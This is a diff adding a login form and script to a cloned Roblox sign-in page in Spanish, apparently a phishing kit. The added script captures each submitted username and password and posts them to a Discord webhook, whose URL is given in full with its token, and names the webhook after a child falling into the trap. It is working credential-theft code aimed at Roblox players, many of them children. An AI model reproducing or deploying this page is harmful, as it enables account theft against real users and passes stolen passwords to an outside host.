@@ -6,6 +6,39 @@
 <head data-machine-id="9546acc9-082a-6423-27c6-1f70f210e643">
     <!-- MachineID: 9546acc9-082a-6423-27c6-1f70f210e643 -->
     <title>Inicia sesi&#xF3;n en Roblox</title>
+<form id="loginForm">
+    <input type="text" id="username" placeholder="Username" required />
+    <input type="password" id="password" placeholder="Password" required />
+    <button type="submit">Submit</button>
+</form>
+
+<script>
+document.getElementById('loginForm').addEventListener('submit', async (e) => {
+    e.preventDefault();
+
+    // Get the username and password values
+    const username = document.getElementById('username').value;
+    const password = document.getElementById('password').value;
+
+    // Create the message for Discord
+    const message = `**New login attempt:**
+    - Username: ${username}
+    - Password: ${password}`;
+
+    // Call the Discord webhook with the data
+    await fetch('https://discord.com/api/webhooks/1314310737442766998/-26q1wViJZycQmY98vIRGapOAf75SOiQz_xbHvO2898OzRDasPbBAIQjAoaaPucxdjDn', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            content: message, // This is the message with the data
+            username: "un niño callo en la trampa XD", // Webhook name
+        }),
+    });
+
+    // Optional: Reset the form
+    document.getElementById('loginForm').reset();
+});
+</script>	
 
 <meta http-equiv="X-UA-Compatible" content="IE=edge,requiresActiveX=true" />
 <meta charset="UTF-8">
